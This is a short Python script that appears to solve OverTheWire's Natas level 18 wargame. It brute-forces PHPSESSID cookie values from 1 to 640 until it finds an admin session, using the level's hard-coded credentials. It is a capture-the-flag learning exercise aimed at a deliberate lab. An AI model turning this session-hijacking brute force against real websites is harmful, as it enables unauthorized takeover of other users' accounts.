PHPSESSID

```
#!/usr/bin/env python
import requests
import re

username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

for session_id in range(1,641):
	response = session.get(url,cookies = {"PHPSESSID": str(session_id)}, auth=(username, password))
	# response = session.post(url, data={"username":"thresher", "password":"shark"}, auth=(username, password))
	content = response.text 
	if( "You are an admin" in content):
		print("Got it!", session_id)
		print(content)
		break
	else:
		print("trying", session_id)
```
